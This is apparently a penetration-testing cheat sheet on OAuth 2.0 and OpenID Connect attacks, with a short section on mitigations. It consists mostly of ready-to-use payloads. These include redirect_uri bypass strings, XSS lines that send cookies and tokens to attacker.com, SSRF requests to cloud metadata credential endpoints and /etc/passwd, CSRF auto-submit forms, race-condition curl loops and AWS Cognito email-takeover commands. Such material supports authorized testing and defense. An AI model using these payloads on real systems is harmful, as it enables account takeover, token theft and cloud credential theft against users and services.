## Theory & Overview

**OAuth 2.0** is an authorization framework that allows third-party applications to access user resources without exposing credentials. It's also used for authentication via **OpenID Connect (OIDC)**.

### Key Components

- **Resource Owner**: The user granting access to their data
- **Resource Server**: API hosting protected resources (e.g., `https://api.example.com`)
- **Client Application**: App requesting access on user's behalf
- **Authorization Server**: Issues access tokens after authentication
- **client_id**: Public identifier for the application
- **client_secret**: Secret key shared between client and auth server
- **response_type**: Defines grant type (`code`, `token`, `id_token`)
- **scope**: Permissions level requested (e.g., `read:email`, `profile`)
- **redirect_uri**: Callback URL after authorization
- **state**: CSRF protection token (should be random & unique per session)
- **grant_type**: Token type being returned
- **code**: Authorization code exchanged for access token
- **access_token**: Token used to access protected APIs
- **refresh_token**: Used to obtain new access tokens
- **nonce**: Prevents replay attacks (OIDC)

### Grant Types

1. **Authorization Code Flow** - Most secure, server-side apps
2. **Implicit Flow** - Client-side apps (deprecated, less secure)
3. **Resource Owner Password Credentials** - Trusted apps only
4. **Client Credentials** - Machine-to-machine
5. **Hybrid Flow** (OIDC) - Combines code + token

### Flow Identification

**Authorization Code Flow:**

- Initial request: `response_type=code`
- Callback contains: `?code=xxx&state=xxx`

**Implicit Flow:**

- Initial request: `response_type=token` or `id_token`
- Callback contains: `#access_token=xxx&token_type=Bearer`

---

## Exploitation Methods

### 1. Open Redirect via redirect_uri

**How it Works:** The `redirect_uri` validation is weak, allowing attackers to redirect authorization codes/tokens to malicious servers.

**Testing Steps:**

```http
# Test 1: External domain
https://auth-server.com/auth?
    response_type=code&
    client_id=CLIENT_ID&
    redirect_uri=https://attacker.com&
    scope=read:email&
    state=RANDOM

# Test 2: Subdomain takeover
redirect_uri=https://vulnerable.victim.com

# Test 3: Domain manipulation
redirect_uri=https://victim.com.attacker.com
redirect_uri=https://victim.com%2eattacker.com
redirect_uri=https://victim.com%09.attacker.com
redirect_uri=https://victim.com%252e.attacker.com

# Test 4: Path traversal
redirect_uri=https://victim.com/callback/../../../attacker-path
redirect_uri=https://victim.com/callback/..%2f..%2fopen-redirect

# Test 5: Localhost variations
redirect_uri=https://localhost.attacker.com
redirect_uri=http://127.0.0.1.attacker.com

# Test 6: IDN Homograph
redirect_uri=https://ÐµxamplÐµ.com

# Test 7: HTTP Parameter Pollution
redirect_uri=https://victim.com&redirect_uri=https://attacker.com

# Test 8: Wildcard abuse
redirect_uri=https://attacker.com/victim.com/

# Test 9: Fragment manipulation
redirect_uri=https://victim.com#@attacker.com
redirect_uri=https://victim.com%20%26@attacker.com

# Test 10: Open redirect on victim domain
redirect_uri=https://victim.com/redirect?url=https://attacker.com
```

**Fuzzing redirect_uri:**

```bash
ffuf -w wordlist.txt -u "https://victim.com/oauth?redirect_uri=https://FUZZ.com/"
```

---

### 2. CSRF - Missing or Weak state Parameter

**Indicators:**

- `state` parameter missing
- Static `state` value (never changes)
- `state` not validated server-side
- `state` predictable or reusable

**Attack Flow:**

1. Attacker initiates OAuth flow with their account
2. Pause right after authorization server redirects back
3. Copy the callback URL (contains `code` or `token`)
4. Send malicious link to victim:

```html
<!-- CSRF payload -->
<a href="https://victim.com/callback?code=ATTACKER_CODE&state=xyz">
    Click here for free stuff!
</a>

<!-- Or auto-submit via iframe -->
<iframe src="https://victim.com/oauth/authorize?client_id=ABC&response_type=code&redirect_uri=https://victim.com/callback&scope=email"></iframe>
```

5. Victim's session links to attacker's account

---

### 3. Account Takeover via Implicit Flow

**Vulnerability:** Server doesn't validate that the `access_token` belongs to the correct `client_id`.

**Steps:**

1. Intercept POST request during OAuth login:

```http
POST /login HTTP/1.1
Host: victim.com
Content-Type: application/json

{
    "email": "victim@example.com",
    "access_token": "ATTACKER_TOKEN"
}
```

2. Change `email` to victim's email
3. Use your own `access_token` from a different OAuth app
4. Server trusts token without validating ownership → ATO

---

### 4. Pre-Account Takeover

**Scenario 1: No Email Verification on Signup**

1. Attacker creates account with `victim@gmail.com` (no verification)
2. Victim later signs up via OAuth (Google/Facebook)
3. Application links OAuth account to existing email → Attacker gains access

**Scenario 2: OAuth Provider Doesn't Verify Email**

1. Attacker creates account on malicious OAuth provider
2. Sets email to `victim@gmail.com`
3. Victim uses this OAuth provider to login elsewhere
4. Application trusts unverified email → ATO

---

### 5. Scope Upgrade Attack

**Authorization Code Flow:**

```http
# Initial authorization request (legitimate)
GET /authorize?response_type=code&client_id=ABC&scope=read:email&redirect_uri=https://client.com/callback

# Token exchange (attacker adds more scopes)
POST /token HTTP/1.1
Host: auth-server.com
Content-Type: application/json

{
    "client_id": "ABC",
    "client_secret": "SECRET",
    "grant_type": "authorization_code",
    "code": "AUTH_CODE",
    "scope": "read:email read:profile write:posts admin:delete"
}
```

If server doesn't validate scope against original request → privilege escalation.

**Implicit Flow:**

Steal `access_token` and manually add scope in API requests:

```http
GET /api/userinfo HTTP/1.1
Authorization: Bearer STOLEN_TOKEN
Scope: read:email read:profile admin:full_access
```

---

### 6. Authorization Code Injection

**Target:** Confidential clients requiring `client_secret`

**Attack:**

1. Attacker steals victim's authorization `code`
2. Injects stolen `code` into their own OAuth flow
3. If no PKCE (`code_challenge`) or nonce validation → attacker logs in as victim

**Prevention Check:**

- Look for `code_challenge` parameter (PKCE enabled)
- OIDC flows: Check for `nonce` in ID token

---

### 7. Token Leakage via Referer Header

**Test Areas:**

1. **OAuth Callback Page:**

```html
<!-- Malicious image on callback page -->
<img src="https://attacker.com/log.php">
```

Check if `Referer` header contains:

```
Referer: https://victim.com/callback?code=SECRET_CODE&state=xyz
```

2. **Authorization Server:**

Same test on authorization endpoint pages.

**Exploitation:** Attacker-controlled content loads → `Referer` leaks tokens.

---

### 8. Credential Leakage via Browser History

**Check:**

- Open browser history (`Ctrl+H`)
- Search for URLs containing:
    - `access_token=`
    - `code=`
    - `id_token=`
    - `refresh_token=`

**Impact:** Anyone with access to victim's device can extract tokens.

---

### 9. HTML Injection & XSS in OAuth Flow

**Test redirect_uri reflection:**

```http
# Payload 1: Basic XSS
redirect_uri=https://victim.com/callback</script><h1>XSS</h1>

# Payload 2: Token theft
redirect_uri=https://victim.com/callback#</script><img src=x onerror="fetch('https://attacker.com?t='+window.location.hash)">

# Payload 3: Referer leak via HTML injection
redirect_uri=https://victim.com/callback?next=<img src="https://attacker.com/steal">
```

If reflected without sanitization → XSS → token theft.

---

### 10. Client Secret Exposure

**Where to Find:**

1. **Mobile/Desktop Apps:**
    
    - Decompile APK/IPA files
    - Search for `client_secret`, `api_key` in source
2. **JavaScript/Frontend Code:**
    

```javascript
// Check bundle.js, app.js, config.js
const config = {
    client_id: "public_id",
    client_secret: "EXPOSED_SECRET" // ❌ Never do this
}
```

3. **Authorization Code Request (Client-Side):**

```http
# Should be server-side only
POST /token HTTP/1.1
Content-Type: application/json

{
    "client_id": "ABC",
    "client_secret": "LEAKED_SECRET", // ❌ Visible in DevTools
    "code": "auth_code"
}
```

**Exploitation:** Use leaked `client_secret` to generate `access_tokens` for any user.

---

### 11. Client Secret Bruteforce

**Attack:**

```http
POST /token HTTP/1.1
Host: auth-server.com
Content-Type: application/x-www-form-urlencoded

code=VALID_CODE&
redirect_uri=https://victim.com/callback&
grant_type=authorization_code&
client_id=PUBLIC_CLIENT_ID&
client_secret=BRUTEFORCE_HERE
```

**Tools:**

- Burp Intruder
- ffuf
- Custom scripts

---

### 12. SSRF via Dynamic Client Registration

**Vulnerable Parameters:**

```http
POST /oauth/register HTTP/1.1
Host: auth-server.com
Content-Type: application/json

{
    "client_name": "Malicious App",
    "redirect_uris": ["https://victim.com/callback"],
    "logo_uri": "http://internal-server/admin",           // SSRF
    "jwks_uri": "http://169.254.169.254/metadata",        // SSRF (AWS)
    "sector_identifier_uri": "http://localhost:8080",     // SSRF
    "policy_uri": "file:///etc/passwd",                    // LFI
    "tos_uri": "gopher://internal:9000/_command"          // SSRF
}
```

**Testing:**

1. Register client with malicious URIs
2. Trigger OAuth flow or token validation
3. Monitor out-of-band interactions (Burp Collaborator, webhook.site)

---

### 13. SSRF via request_uri Parameter

```http
GET /authorize?
    response_type=code&
    client_id=ABC&
    request_uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/&
    scope=openid
```

**Bypass Whitelisting:**

```http
# Path traversal
request_uri=https://whitelisted-domain.com/../../../internal-api

# URL encoding
request_uri=https://whitelisted-domain.com%252f..%252f..%252fssrf
```

---

### 14. Race Conditions in Token Issuance

**Test:**

```bash
# Send 100 simultaneous requests
seq 1 100 | xargs -P 100 -I {} curl -X POST https://auth-server.com/token \
    -d "client_id=ABC&client_secret=SECRET&code=SAME_CODE&grant_type=authorization_code"
```

**Check if:**

- Multiple `access_tokens` generated from single `code`
- Code reuse possible

---

### 15. AWS Cognito Token Privilege Escalation

**Vulnerability:** Cognito `access_token` may have permissions to update user attributes.

**Exploitation:**

```bash
# 1. Extract access_token from OAuth flow
access_token="eyJraWQiOiJPVj..."

# 2. Read current user info
aws cognito-idp get-user \
    --region us-east-1 \
    --access-token $access_token

# 3. Change email to victim's email
aws cognito-idp update-user-attributes \
    --region us-east-1 \
    --access-token $access_token \
    --user-attributes Name=email,Value=victim@example.com

# 4. Confirm email and takeover account
```

---

### 16. Abusing Other Apps' Tokens (Token Confusion)

**Scenario:**

- App A and App B both use Facebook OAuth
- App B trusts any Facebook token without checking `aud` (audience) claim

**Attack:**

1. Login to attacker-controlled App A via Facebook
2. Capture `access_token` issued for App A
3. Use that token to login to App B as victim

**Vulnerable Code:**

```javascript
// ❌ Bad: No audience check
if (token.email === "victim@example.com") {
    loginUser(token.email);
}

// ✅ Good: Validate token belongs to your app
if (token.aud === "YOUR_APP_CLIENT_ID" && token.email === "victim@example.com") {
    loginUser(token.email);
}
```

---

### 17. Mutable Claims Attack (Email-Based User Matching)

**Vulnerability:** App uses `email` claim (mutable) instead of `sub` (immutable) to identify users.

**Attack (Microsoft/Azure AD example):**

1. Attacker creates Azure AD org (e.g., `attacker-org`)
2. Creates user `victim@gmail.com` in their Azure AD
3. Initiates "Login with Microsoft" on target app
4. App trusts `email` field → attacker logs in as victim

**Fix:** Always use `sub` (subject identifier) for user matching, not email.

---

### 18. Redirect Scheme Hijacking (Mobile Apps)

**Vulnerability:** Multiple apps can register same custom URI scheme on Android/iOS.

**Attack:**

1. Victim app uses `com.example.app://oauth` for callbacks
2. Attacker app registers same scheme with intent filter:

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <data android:scheme="com.example.app" android:host="oauth" />
</intent-filter>
```

3. OS prompts user to choose app → attacker steals authorization code

---

### 19. Improper Nonce Validation (OIDC)

**Indicators:**

- `nonce` missing in authorization request
- `nonce` is static/predictable
- `nonce` not validated in ID token
- `nonce` available in cleartext client-side

**Attack:** Replay stolen ID tokens to establish identity.

**Test:**

```http
# Send same nonce twice
GET /authorize?response_type=id_token&nonce=static123&client_id=ABC

# Check if ID token can be reused
```

---

### 20. response_mode Manipulation

**Modes:**

```http
# 1. Query (default)
response_mode=query → ?code=xxx

# 2. Fragment
response_mode=fragment → #code=xxx

# 3. Form POST
response_mode=form_post → <form><input name="code" value="xxx"></form>

# 4. Web Message
response_mode=web_message → window.opener.postMessage({"code": "xxx"}, "*")
```

**Test:** Switch modes to bypass client-side validations or leak tokens.

---

### 21. OAuth ROPC Flow - 2FA Bypass

**Resource Owner Password Credentials (ROPC):**

```http
POST /token HTTP/1.1
Content-Type: application/x-www-form-urlencoded

grant_type=password&
username=victim@example.com&
password=PASSWORD&
client_id=ABC&
client_secret=SECRET
```

**If successful:** Returns `access_token` without 2FA challenge → bypass.

---

### 22. Prompt Bypass (prompt=none)

```http
GET /authorize?
    response_type=code&
    client_id=ABC&
    prompt=none&  # ← Skip consent screen
    redirect_uri=https://attacker.com
```

**If allowed:** Silent authorization without user interaction.

---

### 23. WebFinger User Enumeration (OIDC)

**Endpoint:**

```http
GET /.well-known/webfinger?
    resource=acct:anonymous@victim.com&
    rel=http://openid.net/specs/connect/1.0/issuer

Response:
{
    "subject": "acct:anonymous@victim.com",
    "links": [{
        "rel": "http://openid.net/specs/connect/1.0/issuer",
        "href": "https://auth-server.com"
    }]
}
```

**Test:**

```bash
# Check if user exists
curl "https://auth-server.com/.well-known/webfinger?resource=http://x/victim&rel=http://openid.net/specs/connect/1.0/issuer"
```

---

### 24. CORS Misconfiguration on UserInfo Endpoint

**Test:**

```http
GET /oauth/userinfo HTTP/1.1
Host: auth-server.com
Origin: https://attacker.com
Authorization: Bearer ACCESS_TOKEN

# If response includes:
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

→ Attacker can steal user data via CORS.

---

### 25. ACR/AMR Misconfiguration (MFA Bypass)

**Parameters:**

- `acr_values`: Authentication Context Class Reference
- `amr_values`: Authentication Method Reference

**Bypass Example:**

```http
# Normal flow (password + OTP)
GET /authorize?acr_values=pwd+otp&client_id=ABC

# Bypass attempt (remove OTP)
GET /authorize?acr_values=pwd&client_id=ABC
```

**Test:** Remove strong auth methods and check if accepted.

---

### 26. redirect_uri Session Poisoning

**Scenario:** Authorization server takes `client_id` from session, not request.

**Attack:**

1. Victim visits attacker page
2. Attacker sends hidden request:

```http
POST /authorize HTTP/1.1
Host: auth-server.com
Content-Type: application/json
Cookie: session_id=VICTIM_SESSION

{
    "client_id": "ATTACKER_CLIENT_ID",
    "redirect_uri": "https://attacker.com/callback"
}
```

3. Victim clicks "Authorize" on legitimate site
4. Authorization code sent to attacker's `redirect_uri`

**Bypass Confirmation:** Use `prompt=consent` to force consent screen.

---

## Bypasses & Advanced Techniques

### Bypass redirect_uri Validation

```http
# 1. Case manipulation
redirect_uri=https://VICTIM.COM

# 2. Encoding
redirect_uri=https://victim%2ecom
redirect_uri=https://victim%252ecom

# 3. IP notation
redirect_uri=http://2130706433 (127.0.0.1 in decimal)

# 4. Nullbytes
redirect_uri=https://victim.com%00.attacker.com

# 5. Unicode
redirect_uri=https://vÄ±ctim.com

# 6. DNS rebinding
redirect_uri=https://victim.com.attacker-controlled-dns.com
```

### Bypass state Validation

```python
# If state uses weak randomness, predict it
import hashlib
state = hashlib.md5(f"{user_id}{timestamp}".encode()).hexdigest()

# Or brute force short states
for i in range(1000000):
    attempt = f"state={i:06d}"
```

---

## Top 10 Modern Payloads

### 1. Open Redirect with Fragment Smuggling

```http
redirect_uri=https://victim.com/callback%23@attacker.com%23
```

### 2. XSS via redirect_uri Reflection

```http
redirect_uri=https://victim.com/callback</script><img src=x onerror="fetch('https://attacker.com?'+document.cookie)">
```

### 3. SSRF via jwks_uri (Client Registration)

```json
{
    "jwks_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

### 4. Token Theft via Referer

```html
<img src="https://attacker.com/log" style="display:none">
<!-- Place on OAuth callback page -->
```

### 5. CSRF with Auto-Submit Form

```html
<form action="https://victim.com/oauth/callback" method="GET" id="csrf">
    <input name="code" value="ATTACKER_CODE">
    <input name="state" value="guessable">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### 6. Account Linking CSRF (iframe)

```html
<iframe src="https://victim.com/oauth/authorize?client_id=ABC&redirect_uri=https://victim.com/link-account&response_type=code"></iframe>
```

### 7. Scope Upgrade via Token Reissue

```http
POST /oauth/token/refresh HTTP/1.1
Content-Type: application/json

{
    "refresh_token": "VALID_REFRESH",
    "scope": "admin:full_access"
}
```

### 8. Authorization Code Race Condition

```bash
for i in {1..50}; do
    curl -X POST "https://auth-server.com/token" \
        -d "code=SAME_CODE&client_id=ABC&client_secret=SECRET" &
done
```

### 9. Mobile Scheme Hijacking

```
Intent: com.example.app://oauth?code=stolen_code
```

### 10. AWS Cognito Email Takeover

```bash
aws cognito-idp update-user-attributes \
    --access-token "VICTIM_TOKEN" \
    --user-attributes Name=email,Value=attacker@example.com
```

---

## Higher Impact Scenarios

### 🎯 Full Account Takeover Chain

1. **CSRF** (link attacker account) →
2. **Open Redirect** (leak victim's code) →
3. **Token Confusion** (use code across apps) →
4. **AWS Cognito Escalation** (change email) →
5. **Complete ATO**

### 🎯 Mass Account Compromise

1. Steal `client_secret` from JavaScript
2. Register malicious OAuth app
3. Phish users to authorize
4. Use stolen tokens to access all user accounts

### 🎯 Privilege Escalation

1. Obtain low-privilege `access_token`
2. Exploit scope upgrade vulnerability
3. Add `admin` scope via token refresh
4. Access admin panel

---

## Mitigations (Blue Team)

### 🔒 For Authorization Servers

- **Strict redirect_uri Validation:** Exact match only, no wildcards
- **State Validation:** Always required, cryptographically random
- **PKCE Enforcement:** Mandatory for public clients
- **Scope Validation:** Check against original authorization request
- **Token Binding:** Bind tokens to specific clients (`aud` claim)
- **Short-Lived Codes:** Authorization codes expire in 60 seconds
- **Nonce Validation:** Required for OIDC flows
- **Rate Limiting:** Prevent brute force attacks

### 🔒 For Client Applications

- **Server-Side Token Exchange:** Never expose `client_secret` in frontend
- **Validate ID Tokens:** Check `iss`, `aud`, `exp`, `nonce`
- **Use `sub` for User Matching:** Never rely on mutable claims (email)
- **Implement CSRF Protection:** Validate `state` parameter
- **Secure Token Storage:** HttpOnly cookies, no localStorage
- **TLS Everywhere:** Enforce HTTPS for all OAuth flows
- **Input Validation:** Sanitize all OAuth responses

### 🔒 OpenID Connect Specifics

- **Validate `nonce`:** Must match request value
- **Check `at_hash`:** Access token hash in ID token
- **Verify `c_hash`:** Code hash in hybrid flow
- **Use Latest Libraries:** Keep OAuth/OIDC SDKs updated

---

## Tools & Resources

### 🛠️ Testing Tools

- **Burp Suite** - OAuth extensions, Intruder
- **ffuf** - Fuzzing redirect_uri, parameters
- **OAuth.tools** - Flow visualization
- **jwt.io** - JWT decoder/debugger
- **AWS CLI** - Cognito testing

### 📚 References

- [OAuth 2.0 RFC 6749](https://tools.ietf.org/html/rfc6749)
- [OAuth 2.0 Security Best Practices](https://tools.ietf.org/id/draft-ietf-oauth-security-topics-15.html)
- [OpenID Connect Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html)
- [PortSwigger OAuth Labs](https://portswigger.net/web-security/oauth)
- [HackerOne OAuth Reports](https://hackerone.com/hacktivity?querystring=oauth)

---

## Quick Reference Checklist

**✅ Every OAuth Test Must Include:**

- [ ] Test all `redirect_uri` bypass techniques
- [ ] Check for missing/weak `state` parameter
- [ ] Test `response_type` variations
- [ ] Inspect tokens in browser history
- [ ] Check `Referer` header leakage
- [ ] Look for exposed `client_secret`
- [ ] Test scope upgrade attacks
- [ ] Verify nonce implementation (OIDC)
- [ ] Test SSRF via registration endpoints
- [ ] Check for CORS misconfigurations
- [ ] Test authorization code reuse
- [ ] Verify token audience (`aud`) checks
- [ ] Test mutable claim attacks (email)
- [ ] Check for race conditions
- [ ] Test mobile scheme hijacking (if applicable)

---

**🚀 Pro Tip:** Always check `.well-known/openid-configuration` for server capabilities and endpoints!